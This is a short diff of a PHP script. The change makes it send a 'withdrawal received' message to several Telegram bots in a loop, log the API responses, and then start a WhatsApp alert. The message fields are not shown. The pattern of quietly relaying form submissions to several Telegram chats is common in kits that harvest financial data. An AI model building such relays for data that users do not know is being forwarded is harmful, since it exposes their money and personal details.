@@ -71,13 +71,22 @@ $message .= "🕒 Time: ".$time;
 
 /* ================= SEND TO TELEGRAM ================= */
 
-file_get_contents(
-    "https://api.telegram.org/bot{$botToken}/sendMessage?" .
-    http_build_query([
-        "chat_id" => $chatId,
+foreach ($bots as $bot) {
+
+    $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
+
+    $params = [
+        "chat_id" => $bot['chat_id'],
         "text" => $message
-    ])
-);
+    ];
+
+    $response = file_get_contents(
+        $url . "?" . http_build_query($params)
+    );
+
+    // Debug log (VERY IMPORTANT)
+    error_log("TELEGRAM RESPONSE: " . $response);
+}
 
 echo "WITHDRAWAL RECEIVED";
 /* ================= SEND TO WHATSAPP (CALLMEBOT) ================= */
